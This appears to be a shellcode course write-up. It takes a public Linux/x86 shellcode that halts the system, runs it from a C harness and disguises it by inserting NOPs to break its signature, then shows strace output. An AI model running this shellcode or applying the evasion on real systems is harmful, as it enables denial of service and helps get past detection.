Shellcode source: http://shell-storm.org/shellcode/files/shellcode-483.php
Description: Linux/x86 - execve(/sbin/halt,/sbin/halt) - 27 bytes by TheWorm

This shellcode comes in a C program like so;
--begins--
#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x66\x68\x6c\x74"	// pushw $0x746c
	"\x68\x6e\x2f\x68\x61"	// push	$0x61682f6e
	"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}
--ends--

Let's keep this first example simple - break the pattern with nops :-)

"\x6a\x0b"		// push	$0xb
"\x90"			// nop
"\x58"			// pop	%eax
"\x90"			// nop
"\x99"			// cltd
"\x90"			// nop
"\x52"			// push	%edx
"\x90"			// nop
"\x66\x68\x6c\x74"	// pushw $0x746c
"\x90"			// nop
"\x68\x6e\x2f\x68\x61"	// push	$0x61682f6e
"\x90"			// nop
"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
"\x90"			// nop
"\x89\xe3"		// mov	%esp,%ebx
"\x90"			// nop
"\x52"			// push	%edx
"\x90"			// nop
"\x53"			// push	%ebx
"\x90"			// nop
"\x89\xe1"		// mov	%esp,%ecx
"\x90"			// nop
"\xcd\x80";		// int	$0x80


Let's prove this by compiling and running (I'm going to catch this in strace as a low priv user because I don't really want the halt :-)


paul@SLAE001:~$ gcc execve-halt-altered.c -o execve-halt-altered -m32 -fno-stack-protector -z execstack
paul@SLAE001:~$ strace ./execve-halt-altered 
execve("./execve-halt-altered", ["./execve-halt-altered"], [/* 21 vars */]) = 0
...
write(1, "\n", 1
)                       = 1
write(1, "[+] Linux/x86 execve(/sbin/halt,"..., 44[+] Linux/x86 execve(/sbin/halt,/sbin/halt)
) = 44
write(1, "[+] Date: 11/07/2009\n", 21[+] Date: 11/07/2009
)  = 21
write(1, "[+] Author: TheWorm\n", 20[+] Author: TheWorm
)   = 20
write(1, "\n", 1
)                       = 1
write(1, "[+] Shellcode Size: 38 bytes\n\n", 30[+] Shellcode Size: 38 bytes

) = 30
execve("/sbin/halt", ["/sbin/halt"], [/* 0 vars */]) = 0
...
write(2, "halt: Need to be root\n", 22halt: Need to be root
) = 22
exit_group(1)                           = ?
paul@SLAE001:~$ 

Okay, nice...  This very basic method works.
Although - it does increases the size of the shellcode a fair bit.

